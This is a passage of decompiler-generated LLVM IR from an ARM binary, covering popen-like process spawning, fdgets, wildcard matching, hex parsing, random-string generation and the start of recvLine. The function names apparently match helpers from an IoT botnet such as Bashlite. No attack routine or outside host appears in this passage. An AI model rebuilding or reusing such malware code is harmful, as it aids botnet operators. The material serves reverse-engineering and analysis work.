  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8e20 = load i32, i32* @fp, align 4
  store i32 36392, i32* %stack_var_-4, align 4
  %v2_8e24 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8e24, i32* @fp, align 4
  %v2_8e38 = load i8, i8* %arg2, align 1
  %v7_8e3c = icmp eq i8 %v2_8e38, 114
  br i1 %v7_8e3c, label %dec_label_pc_8e54, label %dec_label_pc_8e44

dec_label_pc_8e44:                                ; preds = %entry
  %v2_8e48 = load i8, i8* %arg2, align 1
  %v7_8e4c = icmp eq i8 %v2_8e48, 119
  br i1 %v7_8e4c, label %dec_label_pc_8e54, label %dec_label_pc_8e68

dec_label_pc_8e54:                                ; preds = %dec_label_pc_8e44, %entry
  %v1_8e58 = add i32 %tmp, 1
  %v1_8e5c = inttoptr i32 %v1_8e58 to i8*
  %v2_8e5c = load i8, i8* %v1_8e5c, align 1
  %v2_8e60 = icmp eq i8 %v2_8e5c, 0
  br i1 %v2_8e60, label %dec_label_pc_8e74, label %dec_label_pc_8e68

dec_label_pc_8e68:                                ; preds = %dec_label_pc_8e44, %dec_label_pc_8e54
  br label %dec_label_pc_9084

dec_label_pc_8e74:                                ; preds = %dec_label_pc_8e54
  %v2_8e74 = ptrtoint i32* %stack_var_-32 to i32
  %v1_8e7c = call i32 @__GI_pipe(i32 %v2_8e74)
  %v1_8e84 = icmp slt i32 %v1_8e7c, 0
  br i1 %v1_8e84, label %dec_label_pc_8e8c, label %dec_label_pc_8e98

dec_label_pc_8e8c:                                ; preds = %dec_label_pc_8e74
  br label %dec_label_pc_9084

dec_label_pc_8e98:                                ; preds = %dec_label_pc_8e74
  %v2_8e9c = load i32, i32* @global_var_2754c.38, align 4
  %v2_8ea0 = icmp eq i32 %v2_8e9c, 0
  br i1 %v2_8ea0, label %dec_label_pc_8ea8, label %dec_label_pc_8f2c

dec_label_pc_8ea8:                                ; preds = %dec_label_pc_8e98
  %v0_8ea8 = call i32 @getdtablesize()
  %v5_8ebc = icmp sgt i32 %v0_8ea8, 0
  br i1 %v5_8ebc, label %dec_label_pc_8ecc, label %dec_label_pc_8ec0

dec_label_pc_8ec0:                                ; preds = %dec_label_pc_8ea8
  br label %dec_label_pc_9084

dec_label_pc_8ecc:                                ; preds = %dec_label_pc_8ea8
  %v3_8ed0 = mul i32 %v0_8ea8, 4
  %v1_8ed8 = call i32 @malloc(i32 %v3_8ed0)
  store i32 %v1_8ed8, i32* @global_var_2754c.38, align 4
  %v2_8ef4 = icmp eq i32 %v1_8ed8, 0
  br i1 %v2_8ef4, label %dec_label_pc_8efc, label %dec_label_pc_8f08

dec_label_pc_8efc:                                ; preds = %dec_label_pc_8ecc
  br label %dec_label_pc_9084

dec_label_pc_8f08:                                ; preds = %dec_label_pc_8ecc
  store i32 %v3_8ed0, i32* @r2, align 4
  %v2_8f28 = inttoptr i32 %v1_8ed8 to i8*
  %v3_8f28 = call i32 @__GI_memset(i8* %v2_8f28, i32 0)
  br label %dec_label_pc_8f2c

dec_label_pc_8f2c:                                ; preds = %dec_label_pc_8e98, %dec_label_pc_8f08
  %v0_8f2c = call i32 @__vfork()
  %v7_8f44 = icmp eq i32 %v0_8f2c, -1
  br i1 %v7_8f44, label %dec_label_pc_8f5c, label %dec_label_pc_8f4c

dec_label_pc_8f4c:                                ; preds = %dec_label_pc_8f2c
  %v2_8f50 = icmp eq i32 %v0_8f2c, 0
  %v2_8f84 = load i8, i8* %arg2, align 1
  %v7_8f88 = icmp eq i8 %v2_8f84, 114
  br i1 %v2_8f50, label %dec_label_pc_8f80, label %dec_label_pc_9020

dec_label_pc_8f5c:                                ; preds = %dec_label_pc_8f2c
  %v3_8f5c = load i32, i32* %stack_var_-32, align 4
  %v1_8f64 = call i32 @__libc_close(i32 %v3_8f5c)
  %v1_8f70 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_9084

dec_label_pc_8f80:                                ; preds = %dec_label_pc_8f4c
  br i1 %v7_8f88, label %dec_label_pc_8f90, label %dec_label_pc_8fc8

dec_label_pc_8f90:                                ; preds = %dec_label_pc_8f80
  %v7_8f94 = icmp eq i32 %tmp3, 1
  br i1 %v7_8f94, label %dec_label_pc_8fb8, label %dec_label_pc_8f9c

dec_label_pc_8f9c:                                ; preds = %dec_label_pc_8f90
  %v0_8fa8 = call i32 @dup2()
  %v1_8fb4 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_8fb8

dec_label_pc_8fb8:                                ; preds = %dec_label_pc_8f90, %dec_label_pc_8f9c
  %v3_8fb8 = load i32, i32* %stack_var_-32, align 4
  %v1_8fc0 = call i32 @__libc_close(i32 %v3_8fb8)
  br label %dec_label_pc_8ffc

dec_label_pc_8fc8:                                ; preds = %dec_label_pc_8f80
  %v3_8fc8 = load i32, i32* %stack_var_-32, align 4
  %v2_8fcc = icmp eq i32 %v3_8fc8, 0
  br i1 %v2_8fcc, label %dec_label_pc_8ff0, label %dec_label_pc_8fd4

dec_label_pc_8fd4:                                ; preds = %dec_label_pc_8fc8
  %v0_8fe0 = call i32 @dup2()
  %v3_8fe4 = load i32, i32* %stack_var_-32, align 4
  %v1_8fec = call i32 @__libc_close(i32 %v3_8fe4)
  br label %dec_label_pc_8ff0

dec_label_pc_8ff0:                                ; preds = %dec_label_pc_8fc8, %dec_label_pc_8fd4
  %v1_8ff8 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_8ffc

dec_label_pc_8ffc:                                ; preds = %dec_label_pc_8fb8, %dec_label_pc_8ff0
  %v8_9014 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1905c.40 to i32), i32 ptrtoint ([3 x i8]* @global_var_19064.42 to i32), i32 ptrtoint ([3 x i8]* @global_var_19068.44 to i32), i32 %arg1, i32 0)
  %v1_901c = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_9020:                                ; preds = %dec_label_pc_8f4c
  br i1 %v7_8f88, label %dec_label_pc_9030, label %dec_label_pc_9048

dec_label_pc_9030:                                ; preds = %dec_label_pc_9020
  %v3_9030 = load i32, i32* %stack_var_-32, align 4
  %v1_9040 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_905c

dec_label_pc_9048:                                ; preds = %dec_label_pc_9020
  %v3_9050 = load i32, i32* %stack_var_-32, align 4
  %v1_9058 = call i32 @__libc_close(i32 %v3_9050)
  br label %dec_label_pc_905c

dec_label_pc_905c:                                ; preds = %dec_label_pc_9030, %dec_label_pc_9048
  %stack_var_-40.0 = phi i32 [ %v3_9030, %dec_label_pc_9030 ], [ %tmp3, %dec_label_pc_9048 ]
  %v3_9060 = mul i32 %stack_var_-40.0, 4
  %v2_906c = load i32, i32* @global_var_2754c.38, align 4
  %v2_9070 = add i32 %v2_906c, %v3_9060
  %v2_9078 = inttoptr i32 %v2_9070 to i32*
  store i32 %v0_8f2c, i32* %v2_9078, align 4
  br label %dec_label_pc_9084

dec_label_pc_9084:                                ; preds = %dec_label_pc_8f5c, %dec_label_pc_8efc, %dec_label_pc_8ec0, %dec_label_pc_8e8c, %dec_label_pc_8e68, %dec_label_pc_905c
  %stack_var_-44.0 = phi i32 [ -1, %dec_label_pc_8e8c ], [ -1, %dec_label_pc_8efc ], [ -1, %dec_label_pc_8f5c ], [ %stack_var_-40.0, %dec_label_pc_905c ], [ -1, %dec_label_pc_8ec0 ], [ -1, %dec_label_pc_8e68 ]
  store i32 %v3_8e20, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v0_8f2c, { 1, 2, 0 }
  uselistorder i32 %v3_8ed0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 5, 4, 3, 2, 1 }
  uselistorder i8* %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9084, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_905c, { 1, 0 }
  uselistorder label %dec_label_pc_8ffc, { 1, 0 }
  uselistorder label %dec_label_pc_8ff0, { 1, 0 }
  uselistorder label %dec_label_pc_8fb8, { 1, 0 }
  uselistorder label %dec_label_pc_8f2c, { 1, 0 }
  uselistorder label %dec_label_pc_8e68, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_90a4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_90a4, i32* @ip, align 4
  %v2_90bc = load i32, i32* @global_var_2754c.38, align 4
  %v2_90c0 = icmp eq i32 %v2_90bc, 0
  br i1 %v2_90c0, label %dec_label_pc_9214, label %dec_label_pc_90c8

dec_label_pc_90c8:                                ; preds = %entry
  %v3_90cc = mul i32 %arg1, 4
  %v2_90dc = add i32 %v2_90bc, %v3_90cc
  %v1_90e0 = inttoptr i32 %v2_90dc to i32*
  %v2_90e0 = load i32, i32* %v1_90e0, align 4
  %v2_90e4 = icmp eq i32 %v2_90e0, 0
  br i1 %v2_90e4, label %dec_label_pc_9214, label %dec_label_pc_90f8

dec_label_pc_90f8:                                ; preds = %dec_label_pc_90c8
  %v1_90fc = call i32 @__libc_close(i32 %arg1)
  %v2_9100 = ptrtoint i32* %stack_var_-276 to i32
  store i32 %v2_9100, i32* @r0, align 4
  %v1_9108 = call i32 @sigemptyset(i32 %v2_9100)
  store i32 %v2_9100, i32* @r0, align 4
  %v2_9118 = call i32 @__GI_sigaddset(i32 %v2_9100, i32 2)
  store i32 %v2_9100, i32* @r0, align 4
  %v2_9128 = call i32 @__GI_sigaddset(i32 %v2_9100, i32 3)
  store i32 %v2_9100, i32* @r0, align 4
  %v2_9138 = call i32 @__GI_sigaddset(i32 %v2_9100, i32 1)
  %v2_9140 = ptrtoint i32* %stack_var_-148 to i32
  %v3_914c = bitcast i32* %stack_var_-276 to %_TYPEDEF_sigset_t*
  %v4_914c = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_914c, i32 %v2_9140)
  %v2_916c = ptrtoint i32* %stack_var_-280 to i32
  br label %dec_label_pc_9150

dec_label_pc_9150:                                ; preds = %dec_label_pc_9194, %dec_label_pc_90f8
  %v2_9160 = load i32, i32* @global_var_2754c.38, align 4
  %v2_9164 = add i32 %v2_9160, %v3_90cc
  %v1_9168 = inttoptr i32 %v2_9164 to i32*
  %v2_9168 = load i32, i32* %v1_9168, align 4
  %v3_917c = call i32 @__libc_waitpid(i32 %v2_9168, i32 %v2_916c, i32 0)
  %v3_918c = icmp eq i32 %v3_917c, -1
  %v8_918c = icmp eq i32 %v3_917c, -1
  br i1 %v3_918c, label %dec_label_pc_9194, label %dec_label_pc_91a8

dec_label_pc_9194:                                ; preds = %dec_label_pc_9150
  %v0_9194 = call i32 @__errno_location()
  %v1_919c = inttoptr i32 %v0_9194 to i32*
  %v2_919c = load i32, i32* %v1_919c, align 4
  %v7_91a0 = icmp eq i32 %v2_919c, 4
  br i1 %v7_91a0, label %dec_label_pc_9150, label %dec_label_pc_91a8

dec_label_pc_91a8:                                ; preds = %dec_label_pc_9150, %dec_label_pc_9194
  %v3_91b8 = bitcast i32* %stack_var_-148 to %_TYPEDEF_sigset_t*
  %v4_91b8 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_91b8, i32 0)
  %v3_91c0 = mul i32 %tmp6, 4
  %v2_91cc = load i32, i32* @global_var_2754c.38, align 4
  %v2_91d0 = add i32 %v2_91cc, %v3_91c0
  %v2_91d8 = inttoptr i32 %v2_91d0 to i32*
  store i32 0, i32* %v2_91d8, align 4
  br i1 %v8_918c, label %dec_label_pc_9214, label %dec_label_pc_91e8

dec_label_pc_91e8:                                ; preds = %dec_label_pc_91a8
  %v3_91e8 = load i32, i32* %stack_var_-280, align 4
  %v1_91f4 = and i32 %v3_91e8, 65280
  %v3_91f81 = udiv i32 %v1_91f4, 256
  br label %dec_label_pc_9214

dec_label_pc_9214:                                ; preds = %dec_label_pc_91e8, %dec_label_pc_91a8, %entry, %dec_label_pc_90c8
  %storemerge4 = phi i32 [ -1, %dec_label_pc_90c8 ], [ -1, %entry ], [ %v3_91f81, %dec_label_pc_91e8 ], [ -1, %dec_label_pc_91a8 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %v2_9100, { 1, 0, 3, 2, 5, 4, 7, 6 }
  uselistorder i32 %v3_90cc, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32* @global_var_2754c.38, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9214, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_91a8, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  br label %dec_label_pc_9298

dec_label_pc_9258:                                ; preds = %dec_label_pc_92a8
  store i32 %v2_92b4, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_9274 = call i32 @__libc_read(i32 %arg3)
  %v1_9284 = add nuw i32 %storemerge25, 1
  %v7_9290 = icmp eq i32 %v1_9274, 1
  br i1 %v7_9290, label %dec_label_pc_9298, label %dec_label_pc_92c8

dec_label_pc_9298:                                ; preds = %entry, %dec_label_pc_9258
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_9284, %dec_label_pc_9258 ]
  %v6_92a4 = icmp slt i32 %storemerge25, %arg2
  br i1 %v6_92a4, label %dec_label_pc_92a8, label %dec_label_pc_92c8

dec_label_pc_92a8:                                ; preds = %dec_label_pc_9298
  %v2_92b4 = add i32 %storemerge25, %arg1
  %v1_92b8 = add i32 %v2_92b4, -1
  %v1_92bc = inttoptr i32 %v1_92b8 to i8*
  %v2_92bc = load i8, i8* %v1_92bc, align 1
  %v7_92c0 = icmp eq i8 %v2_92bc, 10
  br i1 %v7_92c0, label %dec_label_pc_92c8, label %dec_label_pc_9258

dec_label_pc_92c8:                                ; preds = %dec_label_pc_92a8, %dec_label_pc_9298, %dec_label_pc_9258
  %stack_var_-24.0.lcssa = phi i32 [ 1, %dec_label_pc_92a8 ], [ 1, %dec_label_pc_9298 ], [ %v1_9274, %dec_label_pc_9258 ]
  %v2_92cc = icmp eq i32 %stack_var_-24.0.lcssa, 0
  %storemerge3 = select i1 %v2_92cc, i32 0, i32 %arg1
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v2_92b4, { 1, 0 }
  uselistorder i32 %v1_9274, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9298, { 1, 0 }
}

define i32 @parseHex(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_934c3 = load i8, i8* %arg1, align 1
  %v2_93505 = icmp eq i8 %v2_934c3, 0
  br i1 %v2_93505, label %dec_label_pc_9364, label %dec_label_pc_9358

dec_label_pc_9318:                                ; preds = %dec_label_pc_9358
  %v3_931c = mul i32 %stack_var_-20.06, 16
  %v4_9320 = ptrtoint i8* %v3_933c to i32
  %v2_9324 = load i8, i8* %v3_933c, align 1
  %v3_9324 = zext i8 %v2_9324 to i32
  %v4_9330 = mul nuw nsw i32 %v3_9324, 4
  %v5_9330 = add i32 %v4_9330, ptrtoint (i32* @global_var_1906c.47 to i32)
  %v6_9330 = inttoptr i32 %v5_9330 to i32*
  %v7_9330 = load i32, i32* %v6_9330, align 4
  %v2_9334 = or i32 %v7_9330, %v3_931c
  %v1_9340 = add i32 %v4_9320, 1
  %v5_9344 = inttoptr i32 %v1_9340 to i8*
  %v2_934c = load i8, i8* %v5_9344, align 1
  %v2_9350 = icmp eq i8 %v2_934c, 0
  br i1 %v2_9350, label %dec_label_pc_9364, label %dec_label_pc_9358

dec_label_pc_9358:                                ; preds = %entry, %dec_label_pc_9318
  %v3_933c = phi i8* [ %v5_9344, %dec_label_pc_9318 ], [ %arg1, %entry ]
  %stack_var_-20.06 = phi i32 [ %v2_9334, %dec_label_pc_9318 ], [ 0, %entry ]
  %v1_935c = icmp slt i32 %stack_var_-20.06, 0
  br i1 %v1_935c, label %dec_label_pc_9364, label %dec_label_pc_9318

dec_label_pc_9364:                                ; preds = %dec_label_pc_9318, %dec_label_pc_9358, %entry
  %stack_var_-20.0.lcssa = phi i32 [ 0, %entry ], [ %v2_9334, %dec_label_pc_9318 ], [ %stack_var_-20.06, %dec_label_pc_9358 ]
  ret i32 %stack_var_-20.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-20.06, { 1, 2, 0 }
  uselistorder label %dec_label_pc_9364, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9358, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp9 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_937c = load i32, i32* @r4, align 4
  %v6_937c = load i32, i32* @fp, align 4
  store i32 37764, i32* %stack_var_-4, align 4
  %v2_9380 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9380, i32* @fp, align 4
  %v2_9394 = load i8, i8* %arg1, align 1
  %v7_93a0 = icmp eq i8 %v2_9394, 42
  br i1 %v7_93a0, label %dec_label_pc_93d4, label %dec_label_pc_93a8

dec_label_pc_93a8:                                ; preds = %entry
  %v7_93ac = icmp eq i8 %v2_9394, 63
  br i1 %v7_93ac, label %dec_label_pc_9444, label %dec_label_pc_93b4

dec_label_pc_93b4:                                ; preds = %dec_label_pc_93a8
  %v2_93b8 = icmp eq i8 %v2_9394, 0
  br i1 %v2_93b8, label %dec_label_pc_93c4, label %dec_label_pc_949c

dec_label_pc_93c4:                                ; preds = %dec_label_pc_93b4
  %v2_93c8 = load i8, i8* %tmp, align 1
  %v3_93c8 = zext i8 %v2_93c8 to i32
  br label %dec_label_pc_9510

dec_label_pc_93d4:                                ; preds = %entry
  %v1_93d8 = add i32 %tmp9, 1
  %v3_93e4 = inttoptr i32 %v1_93d8 to i8*
  %v4_93e4 = call i32 @wildString(i8* %v3_93e4, i32 %arg2)
  %v2_93ec = icmp eq i32 %v4_93e4, 0
  br i1 %v2_93ec, label %dec_label_pc_9430, label %dec_label_pc_93f4

dec_label_pc_93f4:                                ; preds = %dec_label_pc_93d4
  %v2_93f8 = load i8, i8* %tmp, align 1
  %v2_93fc = icmp eq i8 %v2_93f8, 0
  br i1 %v2_93fc, label %dec_label_pc_9438, label %dec_label_pc_9404

dec_label_pc_9404:                                ; preds = %dec_label_pc_93f4
  %v1_9408 = add i32 %arg2, 1
  %v4_9414 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_9408)
  %v2_941c = icmp eq i32 %v4_9414, 0
  br i1 %v2_941c, label %dec_label_pc_9430, label %dec_label_pc_9438

dec_label_pc_9430:                                ; preds = %dec_label_pc_9404, %dec_label_pc_93d4
  br label %dec_label_pc_9438

dec_label_pc_9438:                                ; preds = %dec_label_pc_93f4, %dec_label_pc_9404, %dec_label_pc_9430
  %storemerge4 = phi i32 [ 0, %dec_label_pc_9430 ], [ 1, %dec_label_pc_9404 ], [ 1, %dec_label_pc_93f4 ]
  br label %dec_label_pc_9510

dec_label_pc_9444:                                ; preds = %dec_label_pc_93a8
  %v2_9448 = load i8, i8* %tmp, align 1
  %v2_944c = icmp eq i8 %v2_9448, 0
  br i1 %v2_944c, label %dec_label_pc_9490, label %dec_label_pc_9454

dec_label_pc_9454:                                ; preds = %dec_label_pc_9444
  %v1_9458 = add i32 %tmp9, 1
  %v1_9460 = add i32 %arg2, 1
  %v2_946c = inttoptr i32 %v1_9458 to i8*
  %v3_946c = call i32 @wildString(i8* %v2_946c, i32 %v1_9460)
  %v2_9474 = icmp ne i32 %v3_946c, 0
  %. = zext i1 %v2_9474 to i32
  br label %dec_label_pc_9490

dec_label_pc_9490:                                ; preds = %dec_label_pc_9454, %dec_label_pc_9444
  %storemerge3 = phi i32 [ 1, %dec_label_pc_9444 ], [ %., %dec_label_pc_9454 ]
  br label %dec_label_pc_9510

dec_label_pc_949c:                                ; preds = %dec_label_pc_93b4
  %v2_94a0 = load i8, i8* %arg1, align 1
  %v3_94a0 = zext i8 %v2_94a0 to i32
  %v1_94a8 = call i32 @__GI_toupper(i32 %v3_94a0)
  store i32 %v1_94a8, i32* @r4, align 4
  %v2_94b4 = load i8, i8* %tmp, align 1
  %v3_94b4 = zext i8 %v2_94b4 to i32
  %v1_94bc = call i32 @__GI_toupper(i32 %v3_94b4)
  %v0_94c4 = load i32, i32* @r4, align 4
  %v9_94c4 = icmp eq i32 %v0_94c4, %v1_94bc
  br i1 %v9_94c4, label %dec_label_pc_94cc, label %dec_label_pc_9508

dec_label_pc_94cc:                                ; preds = %dec_label_pc_949c
  %v1_94d0 = add i32 %tmp9, 1
  %v1_94d8 = add i32 %arg2, 1
  %v2_94e4 = inttoptr i32 %v1_94d0 to i8*
  %v3_94e4 = call i32 @wildString(i8* %v2_94e4, i32 %v1_94d8)
  %v2_94ec = icmp ne i32 %v3_94e4, 0
  %.8 = zext i1 %v2_94ec to i32
  br label %dec_label_pc_9508

dec_label_pc_9508:                                ; preds = %dec_label_pc_94cc, %dec_label_pc_949c
  %storemerge = phi i32 [ 1, %dec_label_pc_949c ], [ %.8, %dec_label_pc_94cc ]
  br label %dec_label_pc_9510

dec_label_pc_9510:                                ; preds = %dec_label_pc_9490, %dec_label_pc_9438, %dec_label_pc_93c4, %dec_label_pc_9508
  %stack_var_-44.0 = phi i32 [ %storemerge4, %dec_label_pc_9438 ], [ %storemerge3, %dec_label_pc_9490 ], [ %v3_93c8, %dec_label_pc_93c4 ], [ %storemerge, %dec_label_pc_9508 ]
  store i32 %v3_937c, i32* @r4, align 4
  store i32 %v6_937c, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_9510, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_9438, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_9540 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_9540, i32* %arg2, align 4
  %v3_9558 = icmp eq i32 %v1_9540, -1
  %. = zext i1 %v3_9558 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i8*, align 4
  %v0_9594 = load i32, i32* %r0.global-to-local, align 4
  %storemerge2 = inttoptr i32 %v0_9594 to i8*
  store i8* %storemerge2, i8** %stack_var_-20, align 4
  %v2_95cc3 = load i8, i8* %storemerge2, align 1
  %v2_95d05 = icmp eq i8 %v2_95cc3, 0
  br i1 %v2_95d05, label %dec_label_pc_95d8, label %dec_label_pc_959c

dec_label_pc_959c:                                ; preds = %entry, %dec_label_pc_959c
  %v2_95d88 = phi i8* [ %storemerge, %dec_label_pc_959c ], [ %storemerge2, %entry ]
  %v2_95a0 = load i8, i8* %v2_95d88, align 1
  %v3_95a0 = zext i8 %v2_95a0 to i32
  store i32 %v3_95a0, i32* %r0.global-to-local, align 4
  %v1_95a8 = call i32 @__GI_toupper(i32 %v3_95a0)
  store i32 %v1_95a8, i32* %r0.global-to-local, align 4
  %v3_95b4 = load i8*, i8** %stack_var_-20, align 4
  %v1_95b8 = trunc i32 %v1_95a8 to i8
  store i8 %v1_95b8, i8* %v3_95b4, align 1
  %v4_95bc = ptrtoint i8* %v3_95b4 to i32
  %v1_95c0 = add i32 %v4_95bc, 1
  %storemerge = inttoptr i32 %v1_95c0 to i8*
  store i8* %storemerge, i8** %stack_var_-20, align 4
  %v2_95cc = load i8, i8* %storemerge, align 1
  %v2_95d0 = icmp eq i8 %v2_95cc, 0
  br i1 %v2_95d0, label %dec_label_pc_95c8.dec_label_pc_95d8_crit_edge, label %dec_label_pc_959c

dec_label_pc_95c8.dec_label_pc_95d8_crit_edge:    ; preds = %dec_label_pc_959c
  %v13_95d8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_95d8

dec_label_pc_95d8:                                ; preds = %dec_label_pc_95c8.dec_label_pc_95d8_crit_edge, %entry
  %v13_95d8 = phi i32 [ %v13_95d8.pre, %dec_label_pc_95c8.dec_label_pc_95d8_crit_edge ], [ %v0_9594, %entry ]
  ret i32 %v13_95d8

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 2, 0 }
  uselistorder i8** %stack_var_-20, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder label %dec_label_pc_959c, { 1, 0 }
}

define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_95e0 = load i32, i32* @r4, align 4
  %v6_95e0 = load i32, i32* @fp, align 4
  %v0_95ec = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-32, align 4
  %v5_965817 = icmp sgt i32 %arg2, 0
  br i1 %v5_965817, label %dec_label_pc_9608, label %dec_label_pc_965c

dec_label_pc_9608:                                ; preds = %entry, %dec_label_pc_9608
  %storemerge118 = phi i32 [ %v1_9644, %dec_label_pc_9608 ], [ 0, %entry ]
  %v2_9614 = add i32 %storemerge118, %v0_95ec
  store i32 %v2_9614, i32* @r4, align 4
  %v0_9618 = call i32 @rand_cmwc()
  %v2_9628 = urem i32 %v0_9618, 26
  store i32 %v2_9628, i32* %r0.global-to-local, align 4
  %v1_9634 = add nuw nsw i32 %v2_9628, 65
  %v1_963c = trunc i32 %v1_9634 to i8
  %v2_963c = load i32, i32* @r4, align 4
  %v3_963c = inttoptr i32 %v2_963c to i8*
  store i8 %v1_963c, i8* %v3_963c, align 1
  %v1_9644 = add i32 %storemerge118, 1
  %v3_9650.pre = load i32, i32* %stack_var_-32, align 4
  %v5_9658 = icmp slt i32 %v1_9644, %v3_9650.pre
  br i1 %v5_9658, label %dec_label_pc_9608, label %dec_label_pc_964c.dec_label_pc_965c_crit_edge

dec_label_pc_964c.dec_label_pc_965c_crit_edge:    ; preds = %dec_label_pc_9608
  %v12_9660.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_965c

dec_label_pc_965c:                                ; preds = %dec_label_pc_964c.dec_label_pc_965c_crit_edge, %entry
  %v12_9660 = phi i32 [ %v12_9660.pre, %dec_label_pc_964c.dec_label_pc_965c_crit_edge ], [ %v0_95ec, %entry ]
  store i32 %v3_95e0, i32* @r4, align 4
  store i32 %v6_95e0, i32* @fp, align 4
  ret i32 %v12_9660

; uselistorder directives
  uselistorder i32 %v1_9644, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_9608, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_96b8.lr.ph:
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-185 = alloca i8, align 1
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9668 = load i32, i32* @fp, align 4
  store i32 %v3_9668, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @r2, align 4
  %v4_9690 = call i32 @__GI_memset(i8* %arg2, i32 0)
  store i32 30, i32* %stack_var_-184, align 4
  %v2_96a4 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_96b8

dec_label_pc_96b8:                                ; preds = %dec_label_pc_96b8.lr.ph, %dec_label_pc_96b8
  %storemerge426 = phi i32 [ 0, %dec_label_pc_96b8.lr.ph ], [ %v1_96cc, %dec_label_pc_96b8 ]
  %v5_96c4 = mul nuw nsw i32 %storemerge426, 4
  %v6_96c4 = add i32 %v5_96c4, %v2_96a4
  %v7_96c4 = inttoptr i32 %v6_96c4 to i32*
  store i32 0, i32* %v7_96c4, align 4
  %v1_96cc = add nuw nsw i32 %storemerge426, 1
  %tmp51 = icmp ult i32 %v1_96cc, 32
  br i1 %tmp51, label %dec_label_pc_96b8, label %dec_label_pc_96e0

dec_label_pc_96e0:                                ; preds = %dec_label_pc_96b8
  %v13_9668 = ptrtoint i32* %stack_var_-16 to i32
  %v3_96e4 = udiv i32 %arg1, 32
  %v3_96f0 = mul nuw nsw i32 %v3_96e4, 4
  %v2_96f8 = add nsw i32 %v3_96f0, -160
  %v2_96fc = add i32 %v2_96f8, %v13_9668
  %v1_9700 = inttoptr i32 %v2_96fc to i32*
  %v2_9700 = load i32, i32* %v1_9700, align 4
  %v1_9708 = urem i32 %arg1, 32
  %v6_9710 = shl i32 1, %v1_9708
  %v2_9714 = or i32 %v2_9700, %v6_9710
  store i32 %v2_9714, i32* %v1_9700, align 4
  %v1_9734 = add i32 %arg1, 1
  %v2_9740 = ptrtoint i32* %stack_var_-184 to i32
